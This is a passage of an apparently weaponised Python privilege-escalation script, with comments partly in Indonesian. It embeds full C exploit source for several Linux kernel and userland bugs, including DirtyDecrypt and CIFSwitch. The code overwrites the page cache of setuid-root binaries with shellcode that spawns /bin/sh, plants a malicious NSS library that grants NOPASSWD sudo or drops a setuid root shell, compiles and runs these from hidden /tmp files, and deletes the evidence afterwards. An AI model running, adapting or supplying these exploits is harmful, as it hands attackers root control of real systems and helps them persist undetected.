    log("\n[=== METHOD 10: Fragnesia (universal LPE — ESP-in-TCP page cache) ===]")

    if os.geteuid() == 0:
        log("[+] already root")
        _reattach_tty()
        os.execl("/bin/sh", "sh")
        return True

    arch = os.uname().machine
    if arch not in ("x86_64", "amd64"):
        log("[-] x86_64 only (got %s)" % arch)
        return False

    if _fragnesia_compile_and_run():
        log("[+++] Fragnesia succeeded — root shell")
        _reattach_tty()
        os.execl(su_found, su_found)
        return True

    log("[-] Fragnesia failed")
    return False

# ──────────────────────────────────────────────────
# METHOD 11: CVE-2026-31635 (DirtyDecrypt — RxGK pagecache write)
# ──────────────────────────────────────────────────

DIRTYDECRYPT_C_SOURCE = r'''
/*
 * DirtyDecrypt (CVE-2026-31635) — RxGK pagecache write
 * Auto-detect SUID, backup, byte-per-byte page cache write.
 * Backup cleanup handled by Python side after root.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <time.h>
#include <poll.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <linux/if.h>
#include <linux/rxrpc.h>
#include <linux/keyctl.h>

#ifndef AF_RXRPC
#define AF_RXRPC 33
#endif
#ifndef SOL_RXRPC
#define SOL_RXRPC 272
#endif
#ifndef RXRPC_SECURITY_KEY
#define RXRPC_SECURITY_KEY 1
#endif
#ifndef RXRPC_MIN_SECURITY_LEVEL
#define RXRPC_MIN_SECURITY_LEVEL 4
#endif
#ifndef RXRPC_SECURITY_ENCRYPT
#define RXRPC_SECURITY_ENCRYPT 2
#endif
#ifndef RXRPC_USER_CALL_ID
#define RXRPC_USER_CALL_ID 1
#endif

#define RXGK_SECURITY_INDEX 6
#define ENCTYPE_AES128_CTS  17
#define AES_KEY_LEN         16

struct rxrpc_wire_header {
	uint32_t epoch;
	uint32_t cid;
	uint32_t callNumber;
	uint32_t seq;
	uint32_t serial;
	uint8_t  type;
	uint8_t  flags;
	uint8_t  userStatus;
	uint8_t  securityIndex;
	uint16_t cksum;
	uint16_t serviceId;
} __attribute__((packed));

#define RXRPC_PACKET_TYPE_DATA      1
#define RXRPC_PACKET_TYPE_CHALLENGE 6
#define RXRPC_LAST_PACKET           0x04

#define LOG(fmt, ...) fprintf(stderr, "[*] " fmt "\n", ##__VA_ARGS__)
#define ERR(fmt, ...) fprintf(stderr, "[-] " fmt "\n", ##__VA_ARGS__)

static const char *g_backup_path = NULL;

static long key_add(const char *type, const char *desc, const void *payload, size_t plen, int ringid)
{
	return syscall(SYS_add_key, type, desc, payload, plen, ringid);
}

static int write_proc(const char *path, const char *buf)
{
	int fd = open(path, O_WRONLY);
	if (fd < 0) return -1;
	int n = write(fd, buf, strlen(buf));
	close(fd);
	return n;
}

static void setup_ns(void)
{
	uid_t uid = getuid();
	gid_t gid = getgid();
	if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
		if (unshare(CLONE_NEWNET) < 0) { perror("unshare"); exit(1); }
	} else {
		write_proc("/proc/self/setgroups", "deny");
		char map[64];
		snprintf(map, sizeof(map), "0 %u 1", uid);
		write_proc("/proc/self/uid_map", map);
		snprintf(map, sizeof(map), "0 %u 1", gid);
		write_proc("/proc/self/gid_map", map);
	}
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	if (s >= 0) {
		struct ifreq ifr = {};
		strncpy(ifr.ifr_name, "lo", IFNAMSIZ);
		if (ioctl(s, SIOCGIFFLAGS, &ifr) == 0) {
			ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
			ioctl(s, SIOCSIFFLAGS, &ifr);
		}
		close(s);
	}
}

static void xdr_put32(uint8_t **pp, uint32_t val) {
	uint32_t nv = htonl(val); memcpy(*pp, &nv, 4); *pp += 4;
}
static void xdr_put64(uint8_t **pp, uint64_t val) {
	xdr_put32(pp, (uint32_t)(val >> 32));
	xdr_put32(pp, (uint32_t)(val & 0xFFFFFFFF));
}
static void xdr_put_data(uint8_t **pp, const void *data, size_t len) {
	xdr_put32(pp, (uint32_t)len);
	memcpy(*pp, data, len); *pp += len;
	size_t pad = (4 - (len & 3)) & 3;
	if (pad) { memset(*pp, 0, pad); *pp += pad; }
}

static int build_rxgk_token(uint8_t *out, size_t maxlen, const uint8_t *base_key, size_t keylen)
{
	uint8_t *p = out;
	struct timespec ts;
	clock_gettime(CLOCK_REALTIME, &ts);
	uint64_t now = (uint64_t)ts.tv_sec * 10000000ULL + (uint64_t)ts.tv_nsec / 100ULL;
	xdr_put32(&p, 0);
	xdr_put_data(&p, "poc.test", 8);
	xdr_put32(&p, 1);
	uint8_t tok[512], *tp = tok;
	xdr_put32(&tp, RXGK_SECURITY_INDEX);
	xdr_put64(&tp, now);
	xdr_put64(&tp, now + 864000000000ULL);
	xdr_put64(&tp, 2);
	xdr_put64(&tp, 864000000000ULL);
	xdr_put64(&tp, 0);
	xdr_put64(&tp, ENCTYPE_AES128_CTS);
	xdr_put_data(&tp, base_key, keylen);
	uint8_t ticket[8] = {0xDE,0xAD,0xBE,0xEF,0xCA,0xFE,0xBA,0xBE};
	xdr_put_data(&tp, ticket, sizeof(ticket));
	size_t toklen = (size_t)(tp - tok);
	xdr_put32(&p, (uint32_t)toklen);
	memcpy(p, tok, toklen); p += toklen;
	if ((size_t)(p - out) > maxlen) return -1;
	return (int)(p - out);
}

static long add_rxgk_key(const char *desc, const uint8_t *base_key, size_t keylen)
{
	uint8_t buf[1024];
	int n = build_rxgk_token(buf, sizeof(buf), base_key, keylen);
	if (n < 0) return -1;
	return key_add("rxrpc", desc, buf, n, KEY_SPEC_PROCESS_KEYRING);
}

static int setup_rxrpc_client(uint16_t local_port, const char *keyname)
{
	int fd = socket(AF_RXRPC, SOCK_DGRAM, PF_INET);
	if (fd < 0) return -1;
	if (setsockopt(fd, SOL_RXRPC, RXRPC_SECURITY_KEY, keyname, strlen(keyname)) < 0) { close(fd); return -1; }
	int min_level = RXRPC_SECURITY_ENCRYPT;
	if (setsockopt(fd, SOL_RXRPC, RXRPC_MIN_SECURITY_LEVEL, &min_level, sizeof(min_level)) < 0) { close(fd); return -1; }
	struct sockaddr_rxrpc srx = {0};
	srx.srx_family = AF_RXRPC;
	srx.srx_service = 0;
	srx.transport_type = SOCK_DGRAM;
	srx.transport_len = sizeof(struct sockaddr_in);
	srx.transport.sin.sin_family = AF_INET;
	srx.transport.sin.sin_port = htons(local_port);
	srx.transport.sin.sin_addr.s_addr = htonl(0x7F000001);
	if (bind(fd, (struct sockaddr *)&srx, sizeof(srx)) < 0) { close(fd); return -1; }
	return fd;
}

static int initiate_call(int cli_fd, uint16_t srv_port, uint16_t service_id)
{
	char data[] = "TESTDATA";
	struct sockaddr_rxrpc srx = {0};
	srx.srx_family = AF_RXRPC;
	srx.srx_service = service_id;
	srx.transport_type = SOCK_DGRAM;
	srx.transport_len = sizeof(struct sockaddr_in);
	srx.transport.sin.sin_family = AF_INET;
	srx.transport.sin.sin_port = htons(srv_port);
	srx.transport.sin.sin_addr.s_addr = htonl(0x7F000001);
	char cmsg_buf[CMSG_SPACE(sizeof(unsigned long))];
	struct msghdr msg = {0};
	msg.msg_name = &srx; msg.msg_namelen = sizeof(srx);
	struct iovec iov = { .iov_base = data, .iov_len = sizeof(data) };
	msg.msg_iov = &iov; msg.msg_iovlen = 1;
	msg.msg_control = cmsg_buf; msg.msg_controllen = sizeof(cmsg_buf);
	struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
	cmsg->cmsg_level = SOL_RXRPC;
	cmsg->cmsg_type = RXRPC_USER_CALL_ID;
	cmsg->cmsg_len = CMSG_LEN(sizeof(unsigned long));
	*(unsigned long *)CMSG_DATA(cmsg) = 0xDEAD;
	int fl = fcntl(cli_fd, F_GETFL);
	fcntl(cli_fd, F_SETFL, fl | O_NONBLOCK);
	ssize_t n = sendmsg(cli_fd, &msg, 0);
	fcntl(cli_fd, F_SETFL, fl);
	if (n < 0 && errno != EAGAIN && errno != EWOULDBLOCK) return -1;
	return 0;
}

static int setup_udp_server(uint16_t port)
{
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	if (s < 0) return -1;
	struct sockaddr_in sa = { .sin_family = AF_INET, .sin_port = htons(port), .sin_addr.s_addr = htonl(0x7F000001) };
	int one = 1;
	setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
	if (bind(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) { close(s); return -1; }
	return s;
}

static ssize_t udp_recv(int s, void *buf, size_t cap, struct sockaddr_in *from, int timeout_ms)
{
	struct pollfd pfd = { .fd = s, .events = POLLIN };
	if (poll(&pfd, 1, timeout_ms) <= 0) return -1;
	socklen_t fl = from ? sizeof(*from) : 0;
	return recvfrom(s, buf, cap, 0, (struct sockaddr *)from, from ? &fl : NULL);
}

static int trigger_seq = 0;

static int fire(int target_fd, off_t splice_off, size_t splice_len, const uint8_t *base_key, size_t keylen)
{
	char keyname[32];
	snprintf(keyname, sizeof(keyname), "rxgk%d", trigger_seq++);
	long key = add_rxgk_key(keyname, base_key, keylen);
	if (key < 0) return -1;
	uint16_t port_S = 10000 + (rand() % 27000) * 2;
	uint16_t port_C = port_S + 1;
	int ret = -1;
	int udp_srv = setup_udp_server(port_S);
	if (udp_srv < 0) goto out_key;
	int cli = setup_rxrpc_client(port_C, keyname);
	if (cli < 0) goto out_udp;
	if (initiate_call(cli, port_S, 1234) < 0) goto out_cli;
	uint8_t pkt[2048];
	struct sockaddr_in cli_addr;
	ssize_t n = udp_recv(udp_srv, pkt, sizeof(pkt), &cli_addr, 50);
	if (n < (ssize_t)sizeof(struct rxrpc_wire_header)) goto out_cli;
	struct rxrpc_wire_header *hdr = (struct rxrpc_wire_header *)pkt;
	uint32_t epoch = ntohl(hdr->epoch);
	uint32_t cid   = ntohl(hdr->cid);
	uint32_t callN = ntohl(hdr->callNumber);
	uint16_t svc   = ntohs(hdr->serviceId);
	uint16_t cport = ntohs(cli_addr.sin_port);
	{
		uint8_t ch[sizeof(struct rxrpc_wire_header) + 20];
		memset(ch, 0, sizeof(ch));
		struct rxrpc_wire_header *c = (struct rxrpc_wire_header *)ch;
		c->epoch = htonl(epoch); c->cid = htonl(cid); c->serial = htonl(0x10000);
		c->type = RXRPC_PACKET_TYPE_CHALLENGE; c->securityIndex = RXGK_SECURITY_INDEX; c->serviceId = htons(svc);
		for (int i = 0; i < 20; i++) ch[sizeof(struct rxrpc_wire_header) + i] = rand() & 0xFF;
		struct sockaddr_in to = { .sin_family = AF_INET, .sin_port = htons(cport), .sin_addr.s_addr = htonl(0x7F000001) };
		sendto(udp_srv, ch, sizeof(ch), 0, (struct sockaddr *)&to, sizeof(to));
	}
	for (int i = 0; i < 3; i++) { struct sockaddr_in src; if (udp_recv(udp_srv, pkt, sizeof(pkt), &src, 5) < 0) break; }
	struct rxrpc_wire_header mal = {0};
	mal.epoch = htonl(epoch); mal.cid = htonl(cid); mal.callNumber = htonl(callN);
	mal.seq = htonl(1); mal.serial = htonl(0x42000);
	mal.type = RXRPC_PACKET_TYPE_DATA; mal.flags = RXRPC_LAST_PACKET;
	mal.securityIndex = RXGK_SECURITY_INDEX; mal.serviceId = htons(svc);
	struct sockaddr_in dst = { .sin_family = AF_INET, .sin_port = htons(cport), .sin_addr.s_addr = htonl(0x7F000001) };
	if (connect(udp_srv, (struct sockaddr *)&dst, sizeof(dst)) < 0) goto out_cli;
	int p[2];
	if (pipe(p) < 0) goto out_cli;
	struct iovec viv = { .iov_base = &mal, .iov_len = sizeof(mal) };
	if (vmsplice(p[1], &viv, 1, 0) < 0) { close(p[0]); close(p[1]); goto out_cli; }
	loff_t off = splice_off;
	if (splice(target_fd, &off, p[1], NULL, splice_len, SPLICE_F_NONBLOCK) < 0) { close(p[0]); close(p[1]); goto out_cli; }
	if (splice(p[0], NULL, udp_srv, NULL, sizeof(mal) + splice_len, 0) < 0) { close(p[0]); close(p[1]); goto out_cli; }
	close(p[0]); close(p[1]);
	usleep(1000);
	int fl = fcntl(cli, F_GETFL);
	fcntl(cli, F_SETFL, fl | O_NONBLOCK);
	for (int i = 0; i < 2; i++) {
		char rb[2048]; struct sockaddr_rxrpc srx; char ccb[256];
		struct msghdr m = {0}; struct iovec iv = { .iov_base = rb, .iov_len = sizeof(rb) };
		m.msg_name = &srx; m.msg_namelen = sizeof(srx);
		m.msg_iov = &iv; m.msg_iovlen = 1;
		m.msg_control = ccb; m.msg_controllen = sizeof(ccb);
		recvmsg(cli, &m, 0);
	}
	ret = 1;
out_cli: close(cli);
out_udp: close(udp_srv);
out_key: syscall(SYS_keyctl, 9, key, KEY_SPEC_PROCESS_KEYRING);
	return ret;
}

static const uint8_t tiny_elf[] = {
	0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x03,0x00,0x3e,0x00,0x01,0x00,0x00,0x00,0x68,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x38,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x78,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x78,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0xb0,0x69,0x0f,0x05,
	0x48,0x8d,0x3d,0xdd,0xff,0xff,0xff,
	0x6a,0x3b,0x58,
	0x0f,0x05,
};

static int pagecache_write(int rfd, void *map, off_t base, const uint8_t *target, int len, off_t file_size, const char *label)
{
	uint8_t key[16];
	uint64_t seed = (uint64_t)time(NULL) * 0x100000001ULL ^ (uint64_t)getpid();
	int max_off = (int)(file_size - 28);
	if (base + len - 1 > max_off) len = max_off - (int)base + 1;
	int start = 0;
	for (int i = 0; i < len; i++) {
		uint8_t cur; pread(rfd, &cur, 1, base + i);
		if (cur != target[i]) { start = i; break; }
		if (i == len - 1) { LOG("pagecache already matches, skipping write"); return 0; }
	}
	int need = len - start;
	LOG("writing shellcode to %s (%d bytes from offset %d)", label, need, (int)base + start);
	for (int i = start; i < len; i++) {
		off_t off = base + i;
		uint8_t want = target[i];
		uint8_t cur; pread(rfd, &cur, 1, off);
		if (cur == want && i > start) continue;
		int ok = 0;
		for (int att = 0; att < 10000; att++) {
			seed ^= seed << 13; seed ^= seed >> 7; seed ^= seed << 17;
			uint64_t r = seed;
			seed ^= seed << 13; seed ^= seed >> 7; seed ^= seed << 17;
			memcpy(key, &r, 8); memcpy(key + 8, &seed, 8);
			size_t slen = 28;
			if (off + (off_t)slen > file_size) slen = file_size - off;
			if (slen < 16) slen = 16;
			int rc = fire(rfd, off, slen, key, AES_KEY_LEN);
			if (rc == 1 && ((const uint8_t *)map)[off] == want) { ok = 1; break; }
		}
		if (!ok) { ERR("byte %d/%d failed", i - start + 1, need); return -1; }
	}
	return 0;
}

int main(int argc, char **argv)
{
	(void)argc; (void)argv;
	srand(time(NULL) ^ getpid());
	fprintf(stderr, "\n=== rxgk pagecache write (DirtyDecrypt) ===\n");
	fprintf(stderr, "uid=%u euid=%u\n", getuid(), geteuid());

	const char *targets[] = { "/usr/bin/su", "/bin/su", "/usr/bin/mount", "/usr/bin/passwd", "/usr/bin/chsh", NULL };
	const char *target_path = NULL;
	for (int i = 0; targets[i]; i++) {
		struct stat sb;
		if (stat(targets[i], &sb) == 0 && (sb.st_mode & S_ISUID) && sb.st_uid == 0 && access(targets[i], R_OK) == 0) {
			target_path = targets[i]; break;
		}
	}
	if (!target_path) { ERR("no readable setuid-root binary found"); return 1; }

	char backup[256];
	const char *base = strrchr(target_path, '/');
	base = base ? base + 1 : target_path;
	snprintf(backup, sizeof(backup), "/tmp/.%s_%d", base, getpid());
	{
		int src = open(target_path, O_RDONLY);
		int dst = open(backup, O_WRONLY | O_CREAT | O_TRUNC, 0600);
		if (src >= 0 && dst >= 0) { char buf[4096]; ssize_t n; while ((n = read(src, buf, sizeof(buf))) > 0) write(dst, buf, n); }
		if (src >= 0) close(src);
		if (dst >= 0) close(dst);
	}

	int rfd = open(target_path, O_RDONLY);
	if (rfd < 0) { perror(target_path); return 1; }
	void *map = mmap(NULL, 4096, PROT_READ, MAP_SHARED, rfd, 0);
	if (map == MAP_FAILED) { perror("mmap"); return 1; }

	pid_t pid = fork();
	if (pid < 0) { perror("fork"); return 1; }
	if (pid == 0) {
		setup_ns();
		usleep(10000);
		int sock = socket(AF_RXRPC, SOCK_DGRAM, PF_INET);
		if (sock < 0) { ERR("AF_RXRPC unavailable"); _exit(1); }
		close(sock);
		struct stat sb; fstat(rfd, &sb);
		_exit(pagecache_write(rfd, map, 0, tiny_elf, sizeof(tiny_elf), sb.st_size, target_path) < 0 ? 2 : 0);
	}

	int st;
	waitpid(pid, &st, 0);
	if (!WIFEXITED(st) || WEXITSTATUS(st) != 0) {
		ERR("corruption failed (status 0x%x)", st);
		ERR("backup at %s — restore: cp %s %s", backup, backup, target_path);
		return 1;
	}
	munmap(map, 4096); close(rfd);
	LOG("exec %s", target_path);
	LOG("backup at %s", backup);
	fflush(stderr);
	execlp(target_path, target_path, (char *)NULL);
	perror(target_path);
	return 1;
}
'''
def _dirtydecrypt_cleanup(*paths):
    for p in paths:
        try:
            os.remove(p)
        except OSError:
            pass


def _dirtydecrypt_cleanup_backup():
    """Hapus backup /tmp/.<name>_<pid> setelah sukses root."""
    import glob
    for f in glob.glob("/tmp/.*_*"):
        base = os.path.basename(f)
        # pattern: .<name>_<pid> — nama target su/mount/passwd/chsh
        if any(base.startswith("." + n + "_") for n in ("su", "mount", "passwd", "chsh")):
            try:
                os.remove(f)
                log("[+] removed backup: %s" % f)
            except OSError:
                pass


def _dirtydecrypt_compile_and_run():
    """Tulis source C, compile, jalankan. Return True kalau root."""
    cc = shutil.which("gcc") or shutil.which("cc")
    if not cc:
        log("[-] No gcc/cc — skip compile")
        return False
    log("[+] compiler: %s" % cc)

    tag = "%08x" % (os.getpid() ^ int(time.time()))
    c_path = "/tmp/.dd_%s.c" % tag
    bin_path = "/tmp/.dd_%s" % tag

    try:
        with open(c_path, "w") as f:
            f.write(DIRTYDECRYPT_C_SOURCE)
    except OSError as e:
        log("[-] write source: %s" % e)
        return False

    log("[*] compiling...")
    try:
        r = subprocess.run(
            [cc, "-O2", "-w", "-o", bin_path, c_path],
            capture_output=True, timeout=300
        )
        if r.returncode != 0:
            err = r.stderr.decode(errors="replace")[:400]
            log("[-] compile failed: %s" % err)
            _dirtydecrypt_cleanup(c_path, bin_path)
            return False
    except Exception as e:
        log("[-] compile error: %s" % e)
        _dirtydecrypt_cleanup(c_path, bin_path)
        return False

    if not os.path.isfile(bin_path):
        log("[-] binary not produced")
        _dirtydecrypt_cleanup(c_path, bin_path)
        return False

    try:
        os.chmod(bin_path, 0o755)
    except OSError:
        pass
    log("[+] compiled: %s" % bin_path)

    log("[*] running DirtyDecrypt (timeout 600s)...")
    try:
        p = subprocess.Popen([bin_path])
        try:
            p.wait(timeout=600)
            rc = p.returncode
        except subprocess.TimeoutExpired:
            p.kill()
            try:
                p.wait(timeout=5)
            except Exception:
                pass
            log("[-] timeout")
            _dirtydecrypt_cleanup(c_path, bin_path)
            return False
    except Exception as e:
        log("[-] run error: %s" % e)
        _dirtydecrypt_cleanup(c_path, bin_path)
        return False

    _dirtydecrypt_cleanup(c_path, bin_path)

    # verifikasi: cek salah satu SUID target mulai dengan ELF shellcode
    for su_path in ["/usr/bin/su", "/bin/su", "/usr/bin/mount", "/usr/bin/passwd", "/usr/bin/chsh"]:
        try:
            with open(su_path, "rb") as f:
                marker = f.read(8)
                # tiny_elf marker: 7f 45 4c 46 02 01 01 00
                # masih ELF, tapi entry di 0x68 (bukan asli)
                f.seek(0x68)
                entry = f.read(4)
                if entry == b"\xb0\x69\x0f\x05":
                    return True
        except OSError:
            continue
    if os.geteuid() == 0:
        return True
    if rc == 0:
        return True
    return False


def try_dirtydecrypt():
    log("\n[=== METHOD 11: CVE-2026-31635 (DirtyDecrypt — RxGK pagecache write) ===]")

    if os.geteuid() == 0:
        log("[+] already root")
        _reattach_tty()
        os.execl("/bin/sh", "sh")
        return True

    arch = os.uname().machine
    if arch not in ("x86_64", "amd64"):
        log("[-] x86_64 only (got %s)" % arch)
        return False

    if _dirtydecrypt_compile_and_run():
        log("[+++] DirtyDecrypt succeeded — root shell")
        # cleanup backup setelah sukses
        _dirtydecrypt_cleanup_backup()
        _reattach_tty()
        os.execl(su_found, su_found)
        return True

    log("[-] DirtyDecrypt failed")
    return False

# ──────────────────────────────────────────────────
# METHOD 12: CVE-2026-46243 (CIFSwitch — cifs.upcall + NSS confusion)
# ──────────────────────────────────────────────────

CVE_2026_46243_C_SOURCE = r'''
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <grp.h>
#include <pwd.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#ifndef __NR_request_key
#if defined(__x86_64__)
#define __NR_request_key 249
#elif defined(__i386__) || defined(__arm__)
#define __NR_request_key 291
#elif defined(__aarch64__)
#define __NR_request_key 217
#elif defined(__mips__) && _MIPS_SIM == _MIPS_SIM_ABI32
#define __NR_request_key 4249
#elif defined(__mips__) && _MIPS_SIM == _MIPS_SIM_NABI32
#define __NR_request_key 6249
#elif defined(__mips__) && _MIPS_SIM == _MIPS_SIM_ABI64
#define __NR_request_key 5249
#else
#error "unknown __NR_request_key for this arch"
#endif
#endif

#ifndef __NR_keyctl
#if defined(__x86_64__)
#define __NR_keyctl 250
#elif defined(__i386__) || defined(__arm__)
#define __NR_keyctl 288
#elif defined(__aarch64__)
#define __NR_keyctl 220
#elif defined(__mips__) && _MIPS_SIM == _MIPS_SIM_ABI32
#define __NR_keyctl 4246
#elif defined(__mips__) && _MIPS_SIM == _MIPS_SIM_NABI32
#define __NR_keyctl 6246
#elif defined(__mips__) && _MIPS_SIM == _MIPS_SIM_ABI64
#define __NR_keyctl 5246
#else
#error "unknown __NR_keyctl for this arch"
#endif
#endif

#ifndef KEY_SPEC_SESSION_KEYRING
#define KEY_SPEC_SESSION_KEYRING -3
#endif

#ifndef KEYCTL_JOIN_SESSION_KEYRING
#define KEYCTL_JOIN_SESSION_KEYRING 1
#endif

static const char NSS_SOURCE[] =
"#define _GNU_SOURCE\n"
"#include <errno.h>\n"
"#include <fcntl.h>\n"
"#include <grp.h>\n"
"#include <nss.h>\n"
"#include <pwd.h>\n"
"#include <stdio.h>\n"
"#include <string.h>\n"
"#include <sys/stat.h>\n"
"#include <sys/types.h>\n"
"#include <unistd.h>\n"
"\n"
"static void write_all(int fd, const char *buf, size_t len) {\n"
"    while (len) { ssize_t r = write(fd, buf, len); if (r <= 0) return; buf += r; len -= (size_t)r; }\n"
"}\n"
"\n"
"__attribute__((constructor))\n"
"static void pwn(void) {\n"
"    int lfd = open(EVIDENCE, O_WRONLY|O_CREAT|O_APPEND|O_CLOEXEC, 0644);\n"
"    if (lfd >= 0) dprintf(lfd, \"NSS loaded by cifs.upcall\\n\");\n"
"    mkdir(\"/etc/sudoers.d\", 0755);\n"
"    int sfd = open(SUDOERS, O_WRONLY|O_CREAT|O_TRUNC|O_CLOEXEC, 0440);\n"
"    if (sfd < 0) {\n"
"        if (lfd >= 0) dprintf(lfd, \"sudoers open fail: %m\\n\");\n"
"        int ifd = open(\"/bin/bash\", O_RDONLY|O_CLOEXEC);\n"
"        int ofd = open(SHELL, O_WRONLY|O_CREAT|O_TRUNC|O_CLOEXEC, 04755);\n"
"        if (ifd >= 0 && ofd >= 0) {\n"
"            char buf[8192]; ssize_t n;\n"
"            while ((n = read(ifd, buf, sizeof(buf))) > 0) write_all(ofd, buf, (size_t)n);\n"
"            fchown(ofd, 0, 0); fchmod(ofd, 04755); fsync(ofd); close(ofd); close(ifd);\n"
"            if (lfd >= 0) dprintf(lfd, \"created suid root shell\\n\");\n"
"        }\n"
"        if (lfd >= 0) close(lfd);\n"
"        return;\n"
"    }\n"
"    const char *c = \"# cifswitch - remove after testing\\n\";\n"
"    write_all(sfd, c, strlen(c));\n"
"    dprintf(sfd, USER \" ALL=(ALL:ALL) NOPASSWD: ALL\\n\");\n"
"    fchmod(sfd, 0440); fsync(sfd); close(sfd);\n"
"    if (lfd >= 0) { dprintf(lfd, \"sudoers written for \" USER \"\\n\"); close(lfd); }\n"
"}\n"
"\n"
"enum nss_status _nss_pwn_getpwuid_r(uid_t uid, struct passwd *pwd,\n"
"    char *buf, size_t len, int *errnop) {\n"
"    const char *n = \"root\", *g = \"root\", *d = \"/root\", *s = \"/bin/bash\";\n"
"    size_t need = strlen(n)+strlen(g)+strlen(d)+strlen(s)+4;\n"
"    char *p = buf;\n"
"    if (len < need) { *errnop = ERANGE; return NSS_STATUS_TRYAGAIN; }\n"
"    strcpy(p, n); pwd->pw_name = p; p += strlen(p)+1;\n"
"    strcpy(p, g); pwd->pw_gecos = p; p += strlen(p)+1;\n"
"    strcpy(p, d); pwd->pw_dir = p;   p += strlen(p)+1;\n"
"    strcpy(p, s); pwd->pw_shell = p;\n"
"    pwd->pw_passwd = (char *)\"x\"; pwd->pw_uid = uid; pwd->pw_gid = 0;\n"
"    *errnop = 0; return NSS_STATUS_SUCCESS;\n"
"}\n";

static void die(const char *msg) { perror(msg); exit(1); }

static long xrequest_key(const char *desc) {
    return syscall(__NR_request_key, "cifs.spnego", desc, "",
                   KEY_SPEC_SESSION_KEYRING);
}

static void setup_keyring(void) {
    long r = syscall(__NR_keyctl, KEYCTL_JOIN_SESSION_KEYRING,
                     "cifswitch", 0, 0, 0);
    if (r < 0) die("KEYCTL_JOIN_SESSION_KEYRING");
}

static void autoload_cifs(void) {
    char mp[] = "/tmp/cif_XXXXXX";
    if (!mkdtemp(mp)) return;
    chmod(mp, 0755);
    pid_t p = fork();
    if (p == 0) {
        int fd = open("/dev/null", O_WRONLY|O_CLOEXEC);
        if (fd >= 0) { dup2(fd, 1); dup2(fd, 2); }
        execlp("mount", "mount", "-t", "cifs", "//127.0.0.1/s", mp,
               "-o", "guest,vers=3.0", NULL);
        _exit(127);
    }
    if (p > 0) { int st; waitpid(p, &st, 0); }
    rmdir(mp);
}

static void mask_dir(const char *path) {
    struct stat st;
    if (stat(path, &st) != 0 || !S_ISDIR(st.st_mode)) return;
    mount("tmpfs", path, "tmpfs", 0, "mode=755");
}

static void bind_nsswitch(const char *src) {
    const char *t[] = {"/etc/nsswitch.conf", "/usr/etc/nsswitch.conf", NULL};
    for (int i = 0; t[i]; i++) {
        struct stat st;
        if (stat(t[i], &st) == 0 && mount(src, t[i], NULL, MS_BIND, NULL) == 0)
            return;
    }
    fprintf(stderr, "[-] no nsswitch bind target found\n");
}

static int write_uid_map(uid_t u) {
    char b[64]; int fd; ssize_t n;
    snprintf(b, sizeof(b), "0 %u 1\n", u);
    fd = open("/proc/self/uid_map", O_WRONLY);
    if (fd < 0) return -1;
    n = write(fd, b, strlen(b)); (void)n; close(fd);
    return 0;
}

static int write_gid_map(gid_t g) {
    char b[64]; int fd; ssize_t n;
    fd = open("/proc/self/setgroups", O_WRONLY);
    if (fd >= 0) { n = write(fd, "deny\n", 5); (void)n; close(fd); }
    snprintf(b, sizeof(b), "0 %u 1\n", g);
    fd = open("/proc/self/gid_map", O_WRONLY);
    if (fd < 0) return -1;
    n = write(fd, b, strlen(b)); (void)n; close(fd);
    return 0;
}

static int has_upcall(void) {
    return access("/usr/sbin/cifs.upcall", F_OK) == 0 ||
           access("/sbin/cifs.upcall", F_OK) == 0;
}

static int user_name(char *out, size_t sz) {
    struct passwd *pw = getpwuid(getuid());
    if (!pw) {
        const char *e = getenv("USER");
        if (!e) return -1;
        snprintf(out, sz, "%s", e);
        return 0;
    }
    snprintf(out, sz, "%s", pw->pw_name);
    return 0;
}

static int has_gcc(void) {
    return system("gcc --version >/dev/null 2>&1") == 0;
}

static int compile_nss(const char *workdir, const char *username) {
    char srcpath[1024], libpath[1024], cmd[4096];
    snprintf(srcpath, sizeof(srcpath), "%s/nss_pwn.c", workdir);
    snprintf(libpath, sizeof(libpath), "%s/%s", workdir, "libnss_pwn.so.2");

    FILE *f = fopen(srcpath, "w");
    if (!f) { perror("write nss src"); return -1; }
    fprintf(f, "%s", NSS_SOURCE);
    fclose(f);

    snprintf(cmd, sizeof(cmd),
        "gcc -shared -fPIC -DUSER=\\\"%s\\\" -DEVIDENCE=\\\"%s/evidence.txt\\\""
        " -DSUDOERS=\\\"%s\\\" -DSHELL=\\\"%s\\\""
        " -o %s %s 2>/dev/null",
        username, workdir, "/etc/sudoers.d/cifswitch_pwn",
        "/var/tmp/cifswitch_rootsh",
        libpath, srcpath);
    int rc = system(cmd);
    if (rc != 0) {
        fprintf(stderr, "[-] NSS compile failed (rc=%d)\n", rc);
        return -1;
    }
    return 0;
}

static int detect_nss_dirs(char dirs[8][256]) {
    const char *cand[] = {
        "/usr/lib64", "/lib64", "/lib/x86_64-linux-gnu",
        "/usr/lib/x86_64-linux-gnu", "/lib/aarch64-linux-gnu",
